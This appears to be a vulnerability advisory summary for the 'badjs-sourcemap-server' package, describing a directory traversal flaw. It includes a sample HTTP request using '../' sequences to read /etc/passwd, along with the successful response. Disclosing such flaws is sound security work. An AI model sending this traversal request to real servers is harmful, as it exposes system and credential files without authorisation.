summary: |
  Directory Traversal
  `badjs-sourcemap-server` recieves files sent by `badjs-sourcemap`.

  `badjs-sourcemap-server` is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing "../" in the url.

  Example request:
  ```
  GET /../../../../../../etc/passwd HTTP/1.1
  host:localhost
  ```
  and response:
  ```
  HTTP/1.1 200 OK
  Date: Wed, 17 May 2017 22:59:49 GMT
  Connection: keep-alive
  Transfer-Encoding: chunked

  {content of /etc/passwd}
  ```
